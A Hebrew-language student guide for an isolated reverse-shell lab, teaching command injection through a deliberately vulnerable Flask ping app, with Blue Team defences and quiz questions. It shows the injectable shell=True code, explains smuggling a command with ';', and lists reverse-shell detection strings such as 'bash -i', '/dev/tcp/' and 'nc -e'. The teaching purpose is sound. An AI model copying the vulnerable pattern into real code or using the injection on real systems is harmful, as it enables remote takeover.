# מעבדת Reverse Shell — מדריך לתלמידים

> תיקייה: `mw/reverse-shell-demo`  
> **למעבדה מבודדת / תרגול מורשה בלבד.** אין להריץ נגד מערכות שאינן בבעלותך.

---

## מטרות למידה

בסיום המעבדה התלמיד/ה יוכל/י:

- להסביר מהו **Reverse Shell** ולמה הוא "הפוך"
- לקשר בין **Command Injection** לבין קבלת shell מרחוק
- לתאר את תפקידי **Attacker / Victim / Exploit**
- לזהות סימנים לזיהוי (Blue Team) ולהציע הגנות

---

## מה זה Reverse Shell?

**Shell רגיל (Bind):** התוקף מתחבר **אל** הקורבן (הקורבן מאזין בפורט).  
**Reverse Shell:** הקורבן מתחבר **בחזרה** אל התוקף (התוקף מאזין).

```
        Firewall / NAT
              │
Victim ───────┼───────► Attacker:4444
  (יוצא)              (מאזין)
```

> **למה זה מסוכן?** הרבה חומות אש חוסמות חיבורים **נכנסים**, אבל מאפשרות חיבורים **יוצאים**. Reverse Shell רוכב על זה.

---

## מבנה התיקייה

```
mw/reverse-shell-demo/
├── README.md                 ← אזהרות + הוראות בסיס
├── attacker/
│   └── listener.sh           ← מאזין netcat בצד התוקף
├── victim/
│   ├── vulnerable_app.py     ← Flask עם Command Injection מכוון
│   └── requirements.txt
└── exploit/
    └── exploit.sh            ← שולח payload דרך פרמטר host=
```

| רכיב | תפקיד |
|------|--------|
| **Listener** | מחכה לחיבור נכנס מהקורבן |
| **Vulnerable App** | טופס Ping שמריץ `shell=True` עם קלט משתמש |
| **Exploit** | מזריק פקודה שפותחת חיבור TCP חזרה לתוקף |

---

## איך החולשה עובדת (מושגית)

באפליקציה הפגיעה:

```python
command = f"ping -c 1 {host}"
subprocess.run(command, shell=True, ...)
```

אם `host` הוא רק `127.0.0.1` — מתבצע ping.  
אם מוסיפים `;` — נשברת הפקודה וניתן להריץ פקודה נוספת.

**שרשרת:**

```
1. Command Injection בטופס web
2. פקודה פותחת חיבור יוצא לתוקף
3. bash מחובר לחיבור → Reverse Shell
```

> זה אותו עיקרון כמו CVE Command Injection שלמדנו — רק שהמטרה כאן היא shell אינטראקטיבי.

---

## הכנת מעבדה (חובה)

| דרישה | פירוט |
|-------|--------|
| **2 מכונות Ubuntu** | Attacker + Victim (או 2 VM) |
| **רשת מבודדת** | Host-only / lab VLAN — **בלי אינטרנט** |
| **אין production** | לא על מחשב אמיתי של משתמשים |

דוגמת כתובות:

| מכונה | IP לדוגמה |
|-------|-----------|
| Attacker | `192.168.56.10` |
| Victim | `192.168.56.20` |

---

## מהלך המעבדה — 3 שלבים

### שלב 1 — Victim

```bash
cd mw/reverse-shell-demo
pip3 install -r victim/requirements.txt
python3 victim/vulnerable_app.py
```

האפליקציה עולה על פורט **5000**.

### שלב 2 — Attacker (חלון 1)

```bash
chmod +x attacker/listener.sh
./attacker/listener.sh 4444
```

### שלב 3 — Exploit (חלון 2 / מהתוקף)

```bash
chmod +x exploit/exploit.sh
./exploit/exploit.sh 192.168.56.20 192.168.56.10 4444
```

| ארגומנט | משמעות |
|---------|--------|
| 1 | IP של הקורבן |
| 2 | IP של התוקף (לאן לחזור) |
| 3 | פורט האזנה |

בחלון ה-listener אמור להופיע חיבור + פרומפט של הקורבן.

---

## מה לשים לב בזמן ההרצה

| תצפית | משמעות |
|-------|--------|
| `curl` נשלח ל-`/ping?host=...` | הניצול עובר דרך HTTP |
| חיבור נכנס ב-`nc` | הקורבן פתח TCP **יוצא** |
| אפשר להריץ פקודות | יש shell מרחוק |

---

## Blue Team — איך מתגוננים?

| שכבה | הגנה |
|------|------|
| **קוד** | לא `shell=True`; `subprocess` עם רשימת args + allow-list ל-IP |
| **הרשאות** | שירות web לא רץ כ-root |
| **רשת** | Egress filtering — חסימת יציאה לפורטים לא צפויים |
| **ניטור** | התראה על `bash -i`, `/dev/tcp/`, `nc -e`, shell מתחת ל-web server |
| **WAF/SAST** | זיהוי דפוסי injection לפני production |

### תיקון קונספטואלי לקוד

```python
# טוב יותר
import re, subprocess
if not re.fullmatch(r"[0-9.]+", host):
    return "invalid host"
subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
```

---

## שאלות לדיון / בוחן קצר

1. מה ההבדל בין Bind Shell ל-Reverse Shell?
2. למה Firewall שחוסם רק inbound לא מספיק?
3. איפה בדיוק נמצאת החולשה ב-`vulnerable_app.py`?
4. ציינו 3 סימנים לזיהוי בצד הגנה.

<details>
<summary>תשובות</summary>

1. Bind = הקורבן מאזין; Reverse = הקורבן מתחבר החוצה לתוקף  
2. Reverse Shell יוצא החוצה — נראה כמו תעבורה "לגיטימית" יוצאת  
3. `host` נכנס ישירות לפקודה עם `shell=True`  
4. תהליך bash מתחת ל-python/flask, חיבור יוצא לפורט לא סטנדרטי, מחרוזות כמו `/dev/tcp/` בלוגים  

</details>

---

## ניקוי

- Victim: `Ctrl+C` על האפליקציה  
- Attacker: `Ctrl+C` על ה-listener / `exit` ב-shell  
- מומלץ: Snapshot לפני המעבדה + שחזור אחריה

---

## קישור לנושאים בקורס

- [Command Injection — CVE-2024-10914](../cyber/Command-Injection-CVE-2024-10914.md)
- [Wireshark — ניתוח תעבורה](../wireshark/Wireshark_Lab_Day1.md)
- [סילבוס — סייבר התקפי / הגנתי](../course-review/syllabus.md)

---

> **למדריך/ה:** התחילו מהשאלה "למה הקורבן יוזם את החיבור?" — זה הרגע שבו התלמידים מבינים את הערך של Egress Filtering.
